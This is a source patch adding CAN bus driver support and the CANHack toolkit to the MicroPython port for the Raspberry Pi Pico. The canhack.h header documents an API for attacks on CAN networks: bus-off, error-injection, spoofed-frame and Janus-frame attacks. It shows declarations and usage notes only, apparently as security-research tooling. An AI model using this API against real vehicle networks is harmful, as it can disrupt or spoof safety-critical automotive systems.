Index: ports/rp2/canis/rp2_can.h
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/canis/rp2_can.h b/ports/rp2/canis/rp2_can.h
new file mode 100644
--- /dev/null	(date 1620557279545)
+++ b/ports/rp2/canis/rp2_can.h	(date 1620557279545)
@@ -0,0 +1,272 @@
+// Copyright 2020 Canis Automotive Labs (https://canislabs.com)
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
+// documentation files (the "Software"), to deal in the Software without restriction, including without limitation
+// the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
+// to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+//
+// The above copyright notice and this permission notice shall be included in all copies or substantial portions of
+// the Software.
+//
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
+// THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
+// TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+// SOFTWARE.
+
+#ifndef MICROPYTHON_CAN_H
+#define MICROPYTHON_CAN_H
+
+#include <py/obj.h>
+
+#include "rp2_mcp251718fd.h"
+
+#define MCP251718FD_TX_QUEUE_SIZE               (32U)           // Must be less <= 32
+#define MCP251718FD_TX_FIFO_SIZE                (32U)           // Must be less <= 32
+#define RX_FIFO_SIZE                            (128U)          // Must be less than 256
+#define TX_EVENT_FIFO_SIZE                      (128U)          // Must be less than 256
+
+#define NUM_FRAME_BYTES                         (19U)
+#define NUM_EVENT_BYTES                         (9U)
+
+#ifdef CAN_DEBUG
+#define CAN_DEBUG_PRINT(fmt, args...)   printf(fmt, ##args)
+#else
+#define CAN_DEBUG_PRINT(fmt, args...)   /* */
+#endif
+
+void can_init(void);
+void can_deinit(void);
+
+/////////////// The binary version of a received CAN frame as bytes is laid out as follows:
+//
+// Byte 0: Flags:
+//      bits 3:0 = event type (0 = transmitted frame, 1 = received frame, 2 = overflow event record, 3 = CAN error)
+//      bits 6:4 = reserved (must be set to 0)
+//      bit 7    = remote frame
+// Bytes 1-4: timestamp (received) or tag (transmitted) (Big endian)
+//
+// Frame                                        Overflow                                    Error
+// -----                                        --------                                    -----
+// Byte 5: DLC
+// Byte 6: Filter index
+// Bytes 7-10:  CAN ID in 32-bit                Bytes 7-10: Frame overflow count            Bytes 7-10: Error info
+//              format (Big endian)
+// Bytes 11-18: Payload (padded to 8 bytes)     Bytes 11-14: Error overflow count
+//
+//
+/////////////// Binary version of a CAN frame to transmit as bytes is laid out as follows:
+//
+// Byte 0:      Flags, as follows:
+//      bits 6:0 = reserved (must be set to 0)
+//      bit 7    = remote
+// Bytes 1-4:   Tag (Big endian)
+// Byte 5:      DLC
+// Byte 6:      Filter index
+// Bytes 7-10:  CAN ID in 32-bit format (Big endian)
+// Bytes 11-18: Payload (padded to8 bytes)
+//
+// CAN ID is a 32-bit integer laid out as follows:
+//
+//      31       23       15       7
+//      V        V        V        V
+//      ++++++++ ++++++++ ++++++++ ++++++++
+//      --EAAAAA AAAAAABB BBBBBBBB BBBBBBBB
+//
+//      E       = Extended ID
+//      A       = 11-bit ID A
+//      B       = 18-bit ID B
+//
+//////////////// Binary version of a CAN transmit event is laid out as follows:
+//
+// Byte 0:      Flags, as follows:
+//      bits 3:0 = event type (0 = transmitted frame, 2 = overflow event record)
+// Bytes 1-4: tag (in big endian format)
+// Bytes 5-8: timestamp (in big endian format)
+//
+//////////////// Binary version of a trigger is laid out as follows:
+//
+// Byte 0:      Flags, as follows:
+//      bits 6:0    = reserved (must be 0)
+//      bits 7      = on error
+// Bytes 1-4:   canid mask (in big endian format)
+// Bytes 5-8:   canid match
+// Byte 9:      DLC mask
+// Byte 10:     DLC match
+// Bytes 11-18: Payload mask
+// Bytes 19-26: Payload match
+
+
+
+typedef uint32_t canid_t;
+
+typedef enum {
+    CAN_BITRATE_500K_75,
+    CAN_BITRATE_250K_75,
+    CAN_BITRATE_125K_75,
+    CAN_BITRATE_1M_75,
+    CAN_BITRATE_500K_50,
+    CAN_BITRATE_250K_50,
+    CAN_BITRATE_125K_50,
+    CAN_BITRATE_1M_50,
+    CAN_BITRATE_2M_50,
+    CAN_BITRATE_4M_90,
+    CAN_BITRATE_2_5M_75 ,
+    CAN_BITRATE_2M_80,
+} canprofile_t;
+
+typedef enum {
+    EVENT_TYPE_TRANSMITTED_FRAME = 0,
+    EVENT_TYPE_RECEIVED_FRAME,
+    EVENT_TYPE_OVERFLOW,
+    EVENT_TYPE_CAN_ERROR
+} canevent_type_t;
+
+typedef enum {
+    CAN_MODE_NORMAL,
+    CAN_MODE_LISTEN_ONLY,
+    CAN_MODE_ACK_ONLY,
+    CAN_MODE_OFFLINE
+} canmode_t;
+
+typedef struct  {
+    canid_t canid;
+    uint32_t payload[2];
+    uint8_t dlc;
+    uint8_t id_filter;
+    bool remote;
+} rx_canframe_t;
+
+typedef struct  {
+    uint32_t frame_cnt;
+    uint32_t error_cnt;
+} rx_overflow_cnt_t;
+
+
+typedef struct  {
+    union {
+        rx_canframe_t rx_frame;
+        rx_overflow_cnt_t overflow_cnt;
+        uint32_t c1bdiag1;
+    } info;
+    uint32_t timestamp;                                 // SOF, microseconds (always valid)
+    canevent_type_t event_type;
+} rx_event_t;
+
+typedef struct  {
+    union {
+        uint32_t generic;                               // Placeholder for all of the words
+        uint32_t frame_tag;                             // Supplied via API
+        uint32_t overflow_cnt;                          // Counts transmit overflow events
+        uint32_t error_info;                            // Details about the error
+    } info;
+    uint32_t timestamp;                                 // SOF, microseconds
+    canevent_type_t event_type;                         // Indicates if a frame transmit, error or overflow
+} tx_event_t;
+
+typedef struct {
+    mp_obj_base_t base;
+    uint32_t tag;                                       // Tag supplied via API for identification of an instance
+    canid_t can_id;
+    uint32_t payload[2];
+    uint32_t timestamp;                                 // SOF, microseconds
+    uint8_t dlc;
+    uint8_t id_filter;
+    bool remote;
+    bool timestamp_valid;                               // true when timestamp is set; cleared when queued for transmission
+} rp2_canframe_obj_t;
+
+// Software receive FIFO
+// This stores details about the CAN frame necessary to create an instance of CANFrame when the
+// recv() call is made
+typedef struct {
+    rx_event_t rx_events[RX_FIFO_SIZE];
+    uint8_t head_idx;                                   // Index into first used frame in the FIFO
+    uint8_t tail_idx;                                   // Index into first free frame at the back of the FIFO
+    uint8_t free;                                       // Number of free slots in the queue
+    uint8_t dropped_event_idx;                          // Used when the FIFO has overrun
+} can_rx_fifo_t;
+
+// Software transmit FIFO; the CAN frame already exists in the MicroPython heap so a
+// reference to it is used
+typedef struct {
+    rp2_canframe_obj_t *frames[MCP251718FD_TX_FIFO_SIZE]; // Frames created on the heap
+    uint8_t head_idx;                                   // Index into first used frame in the FIFO
+    uint8_t tail_idx;                                   // Index into first free frame at the back of the FIFO
+    uint8_t num_free_slots;                             // Number of free slots in the queue
+} can_tx_fifo_t;
+
+// Software shadow structure for the transmit queue
+//
+// When a frame is queued, a pointer to it is put into this array and the sequence number assigned to
+// the index. That index is used later on transmission to take it out and fill in the timestamp.
+typedef struct {
+    rp2_canframe_obj_t *frames[MCP251718FD_TX_QUEUE_SIZE]; // The frames (directly inside MicroPython objects) queued
+    uint32_t num_free_slots;                            // Number of free slots in the queue
+    uint8_t fifo_slot;                                  // If fifo_slot is < MCP251718FD_TX_QUEUE_SIZE true then indicates where the FIFO frame is
+} can_tx_queue_t;
+
+// Transmit event FIFO that records the timestamp and the tag of the transmitted frame
+typedef struct {
+    tx_event_t events[TX_EVENT_FIFO_SIZE];
+    uint8_t head_idx;                                   // Index into first used frame in the FIFO
+    uint8_t tail_idx;                                   // Index into first free frame at the back of the FIFO
+    uint8_t free;                                       // Number of free slots in the queue
+    uint8_t dropped_event_idx;
+} can_event_fifo_t;
+
+// Transmit event FIFO that records the timestamp and the tag of the transmitted frame
+typedef struct {
+    uint32_t can_id_mask;                               // Mask/match values over ID, DLC and payload
+    uint32_t can_id_match;
+    uint32_t can_payload_mask[2];
+    uint32_t can_payload_match[2];
+    uint8_t can_dlc_mask;
+    uint8_t can_dlc_match;
+    bool on_error;                                      // Set if should trigger on error
+    bool on_rx;                                         // Set if should trigger on receiving a matching frame
+    bool enabled;                                       // Set if trigger is enabled
+} can_trigger_t;
+
+// The four CAN API classes:
+//
+// CAN
+// CANID
+// CANFrame
+// CANIDFilter
+
+typedef struct _rp2_canid_obj_t {
+    mp_obj_base_t base;
+    canid_t can_id;
+} rp2_canid_obj_t;
+
+typedef struct _rp2_canidfilter_obj_t {
+    mp_obj_base_t base;
+    uint32_t mask;
+    uint32_t fltobj;
+} rp2_canidfilter_obj_t;
+
+typedef struct _rp2_can_obj_t {
+    mp_obj_base_t base;
+    can_rx_fifo_t rx_fifo;
+    can_tx_fifo_t tx_fifo;
+    can_tx_queue_t tx_queue;
+    can_event_fifo_t event_fifo;
+    can_trigger_t triggers[1];                          // Only one trigger at present
+    canmode_t mode;
+    bool recv_errors;                                   // Whether to record errors in the receive FIFO
+} rp2_can_obj_t;
+
+typedef struct _rp2_canerror_obj_t {
+    mp_obj_base_t base;
+    uint32_t c1bdiag1;                                  // Value of error register
+    uint32_t timestamp;                                 // Read from the controller
+} rp2_canerror_obj_t;
+
+extern const mp_obj_type_t rp2_can_type;
+extern const mp_obj_type_t rp2_canid_type;
+extern const mp_obj_type_t rp2_canframe_type;
+extern const mp_obj_type_t rp2_canidfilter_type;
+extern const mp_obj_type_t rp2_canerror_type;
+
+#endif // MICROPYTHON_CAN_H
Index: ports/rp2/CMakeLists.txt
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/CMakeLists.txt b/ports/rp2/CMakeLists.txt
--- a/ports/rp2/CMakeLists.txt	(revision 321d1897c34f16243edf2c94913d7cf877a013d1)
+++ b/ports/rp2/CMakeLists.txt	(date 1620631165472)
@@ -39,7 +39,7 @@
 endif()
 
 # Include board config
-include(${MICROPY_BOARD_DIR}/mpconfigboard.cmake) 
+include(${MICROPY_BOARD_DIR}/mpconfigboard.cmake)
 
 # Include component cmake fragments
 include(${MICROPY_DIR}/py/py.cmake)
@@ -74,6 +74,7 @@
     ${MICROPY_DIR}/lib/utils/pyexec.c
     ${MICROPY_DIR}/lib/utils/stdout_helpers.c
     ${MICROPY_DIR}/lib/utils/sys_stdio_mphal.c
+    ${MICROPY_DIR}/lib/min/target/min.c
 )
 
 set(MICROPY_SOURCE_DRIVERS
@@ -101,6 +102,11 @@
     rp2_pio.c
     tusb_port.c
     uart.c
+    canis/common.c
+    canis/canhack.c
+    canis/rp2_canhack.c
+    canis/rp2_can.c
+    canis/rp2_min.c
 )
 
 set(MICROPY_SOURCE_QSTR
@@ -123,6 +129,9 @@
     ${PROJECT_SOURCE_DIR}/modutime.c
     ${PROJECT_SOURCE_DIR}/rp2_flash.c
     ${PROJECT_SOURCE_DIR}/rp2_pio.c
+    ${PROJECT_SOURCE_DIR}/canis/rp2_canhack.c
+    ${PROJECT_SOURCE_DIR}/canis/rp2_can.c
+    ${PROJECT_SOURCE_DIR}/canis/rp2_min.c
 )
 
 set(PICO_SDK_COMPONENTS
@@ -154,6 +163,7 @@
     pico_sync
     pico_time
     pico_unique_id
+    tinyusb_common
     tinyusb_device
 )
 
Index: ports/rp2/main.c
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/main.c b/ports/rp2/main.c
--- a/ports/rp2/main.c	(revision 321d1897c34f16243edf2c94913d7cf877a013d1)
+++ b/ports/rp2/main.c	(date 1620564913075)
@@ -44,6 +44,9 @@
 #include "pico/stdlib.h"
 #include "pico/binary_info.h"
 #include "hardware/rtc.h"
+
+#include "canis/rp2_can.h"
+#include "ports/rp2/canis/rp2_min.h"
 #include "hardware/structs/rosc.h"
 
 extern uint8_t __StackTop, __StackBottom;
@@ -59,6 +62,10 @@
     BI_NAMED_GROUP_SEPARATE_COMMAS | BI_NAMED_GROUP_SORT_ALPHA));
 
 int main(int argc, char **argv) {
+    // TODO make these conditionally compiled in with PicoCAN support if this port is pushed upstream
+    can_init();
+    min_init();
+
     #if MICROPY_HW_ENABLE_UART_REPL
     bi_decl(bi_program_feature("UART REPL"))
     setup_default_uart();
@@ -138,6 +145,8 @@
         mp_printf(MP_PYTHON_PRINTER, "MPY: soft reboot\n");
         rp2_pio_deinit();
         machine_pin_deinit();
+        can_deinit();
+        min_deinit();
         gc_sweep_all();
         mp_deinit();
     }
Index: ports/rp2/tusb_config.h
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/tusb_config.h b/ports/rp2/tusb_config.h
--- a/ports/rp2/tusb_config.h	(revision 321d1897c34f16243edf2c94913d7cf877a013d1)
+++ b/ports/rp2/tusb_config.h	(date 1615922170754)
@@ -27,7 +27,7 @@
 
 #define CFG_TUSB_RHPORT0_MODE   (OPT_MODE_DEVICE)
 
-#define CFG_TUD_CDC             (1)
+#define CFG_TUD_CDC             (2)
 #define CFG_TUD_CDC_RX_BUFSIZE  (256)
 #define CFG_TUD_CDC_TX_BUFSIZE  (256)
 
Index: ports/rp2/tusb_port.c
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/tusb_port.c b/ports/rp2/tusb_port.c
--- a/ports/rp2/tusb_port.c	(revision 321d1897c34f16243edf2c94913d7cf877a013d1)
+++ b/ports/rp2/tusb_port.c	(date 1620560592897)
@@ -26,26 +26,41 @@
 
 #include "tusb.h"
 
-#define USBD_VID (0x2E8A) // Raspberry Pi
-#define USBD_PID (0x0005) // RP2 MicroPython
+#define USBD_VID                    (0x2E8AU) // Raspberry Pi
+#define USBD_PID                    (0x0005U) // RP2 MicroPython
+
+#define USBD_DESC_LEN               (TUD_CONFIG_DESC_LEN + (CFG_TUD_CDC * TUD_CDC_DESC_LEN))
+#define USBD_MAX_POWER_MA           (250U)
 
-#define USBD_DESC_LEN (TUD_CONFIG_DESC_LEN + TUD_CDC_DESC_LEN)
-#define USBD_MAX_POWER_MA (250)
+enum
+{
+    USBD_ITF_CDC_0 = 0,
+    USBD_ITF_CDC_0_DATA,
+    USBD_ITF_CDC_1,
+    USBD_ITF_CDC_1_DATA,
+    USBD_ITF_MAX
+};
 
-#define USBD_ITF_CDC (0) // needs 2 interfaces
-#define USBD_ITF_MAX (2)
+#define USBD_ITF_CDC_0              (0) // needs 2 interfaces
+#define USBD_ITF_CDC_1              (2U)
+#define USBD_ITF_MAX                (4U)
 
-#define USBD_CDC_EP_CMD (0x81)
-#define USBD_CDC_EP_OUT (0x02)
-#define USBD_CDC_EP_IN (0x82)
-#define USBD_CDC_CMD_MAX_SIZE (8)
-#define USBD_CDC_IN_OUT_MAX_SIZE (64)
+#define USBD_CDC_0_EP_CMD           (0x81U)
+#define USBD_CDC_0_EP_OUT           (0x02U)
+#define USBD_CDC_0_EP_IN            (0x82U)
+
+#define USBD_CDC_1_EP_CMD           (0x83U)
+#define USBD_CDC_1_EP_OUT           (0x04U)
+#define USBD_CDC_1_EP_IN            (0x84U)
+
+#define USBD_CDC_CMD_MAX_SIZE       (8U)
+#define USBD_CDC_IN_OUT_MAX_SIZE    (64U)
 
-#define USBD_STR_0 (0x00)
-#define USBD_STR_MANUF (0x01)
-#define USBD_STR_PRODUCT (0x02)
-#define USBD_STR_SERIAL (0x03)
-#define USBD_STR_CDC (0x04)
+#define USBD_STR_0                  (0x00)
+#define USBD_STR_MANUF              (0x01U)
+#define USBD_STR_PRODUCT            (0x02U)
+#define USBD_STR_SERIAL             (0x03U)
+#define USBD_STR_CDC                (0x04U)
 
 // Note: descriptors returned from callbacks must exist long enough for transfer to complete
 
@@ -66,12 +81,15 @@
     .bNumConfigurations = 1,
 };
 
-static const uint8_t usbd_desc_cfg[USBD_DESC_LEN] = {
-    TUD_CONFIG_DESCRIPTOR(1, USBD_ITF_MAX, USBD_STR_0, USBD_DESC_LEN,
-        0, USBD_MAX_POWER_MA),
+static const uint8_t usbd_desc_cfg[] = {
+    // Config number, interface count, string index, total length, attribute, power in mA
+    TUD_CONFIG_DESCRIPTOR(1, USBD_ITF_MAX, USBD_STR_0, USBD_DESC_LEN, 0, USBD_MAX_POWER_MA),
 
-    TUD_CDC_DESCRIPTOR(USBD_ITF_CDC, USBD_STR_CDC, USBD_CDC_EP_CMD,
-        USBD_CDC_CMD_MAX_SIZE, USBD_CDC_EP_OUT, USBD_CDC_EP_IN, USBD_CDC_IN_OUT_MAX_SIZE),
+    // 1st CDC: Interface number, string index, EP notification address and size, EP data address (out, in) and size.
+    TUD_CDC_DESCRIPTOR(USBD_ITF_CDC_0, USBD_STR_CDC, USBD_CDC_0_EP_CMD, USBD_CDC_CMD_MAX_SIZE, USBD_CDC_0_EP_OUT, USBD_CDC_0_EP_IN, USBD_CDC_IN_OUT_MAX_SIZE),
+
+    // 2nd CDC: Interface number, string index, EP notification address and size, EP data address (out, in) and size.
+    TUD_CDC_DESCRIPTOR(USBD_ITF_CDC_1, USBD_STR_CDC, USBD_CDC_1_EP_CMD, USBD_CDC_CMD_MAX_SIZE, USBD_CDC_1_EP_OUT, USBD_CDC_1_EP_IN, USBD_CDC_IN_OUT_MAX_SIZE),
 };
 
 static const char *const usbd_desc_str[] = {
Index: ports/rp2/canis/canhack.h
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/canis/canhack.h b/ports/rp2/canis/canhack.h
new file mode 100644
--- /dev/null	(date 1620554587425)
+++ b/ports/rp2/canis/canhack.h	(date 1620554587425)
@@ -0,0 +1,179 @@
+// The CANHack toolkit
+// ===================
+//
+// Created by ken (https://kentindell.github.io) on 11/12/2019. This code is licensed under the MIT license:
+//
+// -------------------------------------------------------------------------------------------------------------------
+// Copyright 2020 Dr. Ken Tindell (https://kentindell.github.io)
+//
+// Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated
+// documentation files (the "Software"), to deal in the Software without restriction, including without limitation
+// the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and
+// to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+//
+// The above copyright notice and this permission notice shall be included in all copies or substantial portions of
+// the Software.
+//
+// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO
+// THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
+// TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+// SOFTWARE.
+// -------------------------------------------------------------------------------------------------------------------
+//
+// The CANHack toolkit is a bit-banging implementation of part of the CAN protocol to enable attacks on CAN.
+//
+// The toolkit is portable and requires access to GPIO pins for CAN TX and CAN RX and access to a timer.
+//
+// Porting
+// =======
+//
+// CANHACK_BOARD_H should be defined with the filename of the header file that contains the definitions. An
+// example header file is given for the Raspberry Pi Pico that uses an RP2040 microcontroller, called canhack-rp2.h.
+//
+// There are inline functions that must be defined so that canhack.c can deal with the machine-dependent driving of
+// the I/O pins.
+//
+// The toolkit currently spins in software to detect the key events (start/end of bit, sample point, falling edge on
+// CAN TX). Some microcontrollers will have timer/counter hardware that can support this more directly (such as
+// putting a value on an output pin when the timer matches a value). But this toolkit is designed for maximum
+// portability and to show how hijacking a microcontroller with a CAN transceiver connected to an arbitrary I/O
+// port could hack the CAN protocol.
+//
+// Using the API
+// =============
+//
+// 1.  The first step is to initialize CANHack with the canhack_init() call. This takes a bit time (in CPU cycles, the same
+//     timebase in the CPU clock macros). It also takes a sample point as clock cycles from the start of the bit. The
+//     time between events must be long enough that the software has run before the next event occurs, so the sample point
+//     cannot be too close to the end of bit. 75% of a bit time should be OK.
+//
+// 2.  The second step is to define the properties of the CAN frame in the hack. A handle to the frame is obtained
+//     by the canhack_get_frame() call (two frames can be defined, and the call takes a parameter to indicate whether
+//     the first or second frame is being set). The canhack_set_frame() call is used to set the parameters of the frame.
+//     The CAN ID is split into 11 bit and 18 bit extension parts, since this is how the CAN protocol actually works.
+//     The MicroPython wrapper for the toolkit calculates these values from a single integer depending on whether the
+//     frame is marked standard or extended.
+//
+// 3a. If the CAN frame is to be transmitted on the bus then the canhack_send_frame() or canhack_send_janus_frame()
+//     call can be made. This enters the frame into arbitration and transmits it. A timeout and a retries parameter
+//     can be set (if retries is 0 then the call will return if it loses arbitration or there is an error during
+//     transmission after arbitration).
+//
+// 3b. Alternatively, if the CAN frame is to be used as a template for a protocol attack then the mask/match values used
+//     to target a frame should be set. This is done by calling canhack_set_attack_masks(). Then an attack call can be made.
+//
+// 4a. To mount a Bus-off attack, a Double Receive Attack, or a Freeze Doom Loop Attack, use the canhack_error_attack()
+//     call.
+// 4b. To mount a spoof attack, use the canhack_spoof_frame() call.
+//
+// 4c. To mount an error passive spoof attack, uise the canhack_spoof_frame_error_passive() call.
+//
+// The specifics of each API call are documented below.
+
+#ifndef CANHACK_H
+#include <inttypes.h>
+#include <stdbool.h>
+
+#ifndef CANHACK_BOARD_H
+#define CANHACK_BOARD_H     "rp2_canhack.h"
+#endif
+
+#include CANHACK_BOARD_H
+#include <stdio.h>
+
+#define CANHACK_MAX_BITS                        (160U)
+
+/// Structure that defines a CAN frame parameters
+typedef struct {
+    uint8_t tx_bitstream[CANHACK_MAX_BITS];     ///< The bitstream of the CAN frame
+    bool stuff_bit[CANHACK_MAX_BITS];           ///< Indicates if the corresponding bit is a stuff bit
+    uint8_t tx_bits;                            ///< Number of  bits in the frame
+    uint32_t tx_arbitration_bits;               ///< Number of bits in arbitartion (including stuff bits); the fields are ID A + RTR (standard) or ID A + SRR + IDE + ID B + RTR (extended)
+
+    // Fields set when creating the CAN frame
+    uint32_t crc_rg;                            ///< CRC value (15 bit value)
+    uint32_t last_arbitration_bit;              ///< Bit index of last arbitration bit (always the RTR bit for both IDE = 0 and IDE = 1); may be a stuff bit
+    uint32_t last_dlc_bit;                      ///< Bit index of last bit of DLC field; may be a stuff bit
+    uint32_t last_data_bit;                     ///< Bit index of the last bit of the data field; may be a stuff bit
+    uint32_t last_crc_bit;                      ///< Bit index of last bit of the CRC field; may be a stuff bit
+    uint32_t last_eof_bit;                      ///< Bit index of the last bit of the EOF field; may be a stuff bit
+    bool frame_set;                             ///< True when the frame has been set; may be a stuff bit
+
+    // Fields used during creation of the CAN frame
+    uint32_t dominant_bits;                     ///< Dominant bits in a row
+    uint32_t recessive_bits;                    ///< Recessive bits in a row
+    bool stuffing;                              ///< True if stuffing enabled
+    bool crcing;                                ///< True if CRCing enabled
+} canhack_frame_t;
+
+/// \brief Initialize CANHack toolkit
+void canhack_init(void);
+
+/// \brief Set the parameters of the CAN frame
+/// \param id_a 11-bit CAN ID
+/// \param id_b 18-bit extension to CAN ID (used if ide=true)
+/// \param rtr true if frame is remote
+/// \param ide true if frame is extended
+/// \param dlc DLC field; data length if a data frame, arbitrary 4-bit value if a remote frame
+/// \param data pointer to up to 8 bytes of payload
+/// \param frame the handle to the frame (see canhack_get_frame)
+void canhack_set_frame(uint32_t id_a, uint32_t id_b, bool rtr, bool ide, uint32_t dlc, const uint8_t *data, canhack_frame_t *frame);
+
+/// \brief Get handle to frame
+/// \param second true if frame 2 is wanted
+/// \return handle to frame
+canhack_frame_t *canhack_get_frame(bool second);
+
+/// \brief Set the attack masks from frame 1 (frame 1 must be set)
+void canhack_set_attack_masks(void);
+
+/// \brief Send a square wave on the CAN TX pin (used to check setup)
+void canhack_send_square_wave(void);
+
+/// \brief Send to the CAN TX pin what is seen on the CAN RX pin (used for testing)
+void canhack_loopback(void);
+
+/// \brief Send a CAN frame to the CAN bus without waiting for 11 idle bits or syncing with SOF
+void canhack_send_raw_frame(void);
+
+/// \brief Send a frame on the CAN bus (not an attack)
+/// \param timeout Number of bit times to wait until frame is sent
+/// \param retries Number of times the frame should be re-entered into arbitration (after losing or after an error)
+/// \return True if frame was sent OK, false if timed out or too many retries
+bool canhack_send_frame(uint32_t timeout, uint32_t retries);
+
+/// \brief Send a Janus frame on the CAN bus
+/// \param timeout Number of bit times to wait until frame is sent
+/// \param sync_time Time of dominant state at start of bit
+/// \param split_time Time when phase 1 bit value is set to phase 2 bit value
+/// \param retries Number of times the frame should be re-entered into arbitration (after losing or after an error)
+/// \return
+bool canhack_send_janus_frame(uint32_t timeout, ctr_t sync_time, ctr_t split_time, uint32_t retries);
+
+/// \brief Send a spoofed frame just after the target frame ends
+/// \param timeout Number of bit times to wait until frame is sent
+/// \param janus True if the spoof is a Janus frame
+/// \param sync_time Time of dominant state at start of bit (if a Janus frame)
+/// \param split_time Time when phase 1 bit value is set to phase 2 bit value (if a Janus frame)
+/// \param retries Number of times the frame should be re-entered into arbitration (after losing or after an error)
+/// \return True if frame was sent OK, false if timed out or too many retries
+bool canhack_spoof_frame(uint32_t timeout, bool janus, ctr_t sync_time, ctr_t split_time, uint32_t retries);
+
+/// \brief Overwrite the target frame (sender must be in error passive mode)
+/// \param timeout Number of bit times to wait until frame is sent
+/// \return False if the timeout occurred or there was an error, true if the spoof frame was sent
+bool canhack_spoof_frame_error_passive(uint32_t timeout);
+
+/// \brief Destroy a frame and generate errors
+/// \param timeout Number of bit times to wait until targeted frame is seen
+/// \param repeat Number of times to repeat the attack at the end of the targeted frame
+/// \param inject_error True if an error should be injected after the end of arbitration when the frame is seen
+/// \param eof_mask The mask for which bits at the end of the targeted frame should be used to trigger the attack
+/// \param eof_match The values corresponding to each bit in the mask
+/// \return True if the attack succeeded and false if the timeout occurred
+bool canhack_error_attack(uint32_t timeout, uint32_t repeat, bool inject_error, uint32_t eof_mask, uint32_t eof_match);
+
+#define CANHACK_H
+
+#endif //CANHACK_H
Index: ports/rp2/modrp2.c
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/modrp2.c b/ports/rp2/modrp2.c
--- a/ports/rp2/modrp2.c	(revision 321d1897c34f16243edf2c94913d7cf877a013d1)
+++ b/ports/rp2/modrp2.c	(date 1620564913067)
@@ -24,6 +24,8 @@
  * THE SOFTWARE.
  */
 
+#include <canis/rp2_can.h>
+#include <ports/rp2/canis/rp2_min.h>
 #include "py/runtime.h"
 #include "modrp2.h"
 
@@ -32,6 +34,13 @@
     { MP_ROM_QSTR(MP_QSTR_Flash),               MP_ROM_PTR(&rp2_flash_type) },
     { MP_ROM_QSTR(MP_QSTR_PIO),                 MP_ROM_PTR(&rp2_pio_type) },
     { MP_ROM_QSTR(MP_QSTR_StateMachine),        MP_ROM_PTR(&rp2_state_machine_type) },
+    { MP_ROM_QSTR(MP_QSTR_CANHack),             MP_ROM_PTR(&rp2_canhack_type) },
+    { MP_ROM_QSTR(MP_QSTR_CAN),                 MP_ROM_PTR(&rp2_can_type) },
+    { MP_ROM_QSTR(MP_QSTR_CANID),               MP_ROM_PTR(&rp2_canid_type) },
+    { MP_ROM_QSTR(MP_QSTR_CANFrame),            MP_ROM_PTR(&rp2_canframe_type) },
+    { MP_ROM_QSTR(MP_QSTR_CANIDFilter),         MP_ROM_PTR(&rp2_canidfilter_type) },
+    { MP_ROM_QSTR(MP_QSTR_CANError),            MP_ROM_PTR(&rp2_canerror_type) },
+    { MP_ROM_QSTR(MP_QSTR_MIN),                 MP_ROM_PTR(&rp2_min_type) },
 };
 STATIC MP_DEFINE_CONST_DICT(rp2_module_globals, rp2_module_globals_table);
 
Index: ports/rp2/mpconfigport.h
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
<+>UTF-8
===================================================================
diff --git a/ports/rp2/mpconfigport.h b/ports/rp2/mpconfigport.h
--- a/ports/rp2/mpconfigport.h	(revision 321d1897c34f16243edf2c94913d7cf877a013d1)
+++ b/ports/rp2/mpconfigport.h	(date 1620560013413)
@@ -163,6 +163,9 @@
 extern const struct _mp_obj_module_t mp_module_uos;
 extern const struct _mp_obj_module_t mp_module_utime;
 
+extern const struct _mp_obj_type_t rp2_canhack_type;
+extern const struct _mp_obj_type_t rp2_can_type;
+
 #define MICROPY_PORT_BUILTIN_MODULES \
     { MP_OBJ_NEW_QSTR(MP_QSTR_machine), (mp_obj_t)&mp_module_machine }, \
     { MP_OBJ_NEW_QSTR(MP_QSTR__onewire), (mp_obj_t)&mp_module_onewire }, \
@@ -174,6 +177,8 @@
     const char *readline_hist[8]; \
     void *machine_pin_irq_obj[30]; \
     void *rp2_pio_irq_obj[2]; \
+    struct _rp2_can_obj_t *rp2_can_obj; \
+    struct _rp2_min_obj_t *rp2_min_obj; \
     void *rp2_state_machine_irq_obj[8]; \
     void *rp2_uart_rx_buffer[2]; \
     void *rp2_uart_tx_buffer[2]; \
Index: ports/rp2/canis/rp2_mcp251718fd.h
IDEA additional info:
Subsystem: com.intellij.openapi.diff.impl.patch.CharsetEP
